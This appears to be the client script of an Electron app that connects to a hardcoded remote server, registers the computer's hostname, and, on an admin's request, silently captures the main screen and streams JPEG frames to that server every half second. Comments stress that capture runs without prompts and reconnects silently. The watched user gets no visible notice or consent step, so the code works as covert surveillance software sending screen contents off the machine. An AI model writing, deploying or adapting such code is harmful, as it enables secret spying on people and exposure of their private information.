// =========================================================================
// VERY IMPORTANT:
// Change this to the IP Address of your main laptop (Anzee Laptop)
// Example: const SERVER_URL = "http://192.168.1.15:3000";
// =========================================================================
const SERVER_URL = "https://cml-0v9b.onrender.com"; // REPLACE THIS BEFORE BUILDING EXE!

let socket;
let localStream;
let screenInterval = null;

window.onload = async () => {
    // Dynamically load socket.io-client from the server
    const script = document.createElement('script');
    script.src = SERVER_URL + '/socket.io/socket.io.js';

    script.onload = async () => {
        socket = io(SERVER_URL);

        // Get the computer name (e.g., "Aqu-Laptop")
        const hostname = await window.electronAPI.getHostname();

        socket.on('connect', () => {
            console.log("Connected to Admin Server");
            // Register this laptop to the Admin Dashboard
            socket.emit('register-client', hostname);
        });

        // When the admin clicks "Watch" on the dashboard
        socket.on('request-offer', async (adminId) => {
            console.log("Received 'request-offer' from admin:", adminId);
            socket.emit('client-error', "Received request-offer, getting screen...");
            try {
                // Automatically get all screens
                const sources = await window.electronAPI.getSources();
                console.log("Screen sources found:", sources.length);
                // Select the primary screen (first one)
                const mainScreen = sources[0];

                // Capture the screen without any prompts
                localStream = await navigator.mediaDevices.getUserMedia({
                    audio: false,
                    video: {
                        mandatory: {
                            chromeMediaSource: 'desktop',
                            chromeMediaSourceId: mainScreen.id
                        }
                    }
                });

                const video = document.createElement('video');
                video.srcObject = localStream;
                video.play();

                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d', { alpha: false });

                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                };

                if (screenInterval) clearInterval(screenInterval);
                
                screenInterval = setInterval(() => {
                    if (video.videoWidth > 0 && video.videoHeight > 0) {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        // Send JPEG frame with 0.5 quality for performance
                        const frame = canvas.toDataURL('image/jpeg', 0.5);
                        socket.emit('screen-frame', { frame: frame, targetId: adminId });
                    }
                }, 500); // 2 frames per second for monitoring

            } catch (e) {
                console.error("Silent screen capture failed", e);
                socket.emit('client-error', "Capture failed: " + e.message);
            }
        });

        socket.on('stop-watch', () => {
             console.log("Stopping watch");
             if (screenInterval) clearInterval(screenInterval);
             if (localStream) {
                 localStream.getTracks().forEach(t => t.stop());
                 localStream = null;
             }
        });
    };

    // If server is not running right now, retry every 5 seconds silently
    script.onerror = () => {
        setTimeout(() => {
            window.location.reload();
        }, 5000);
    };

    document.head.appendChild(script);
};
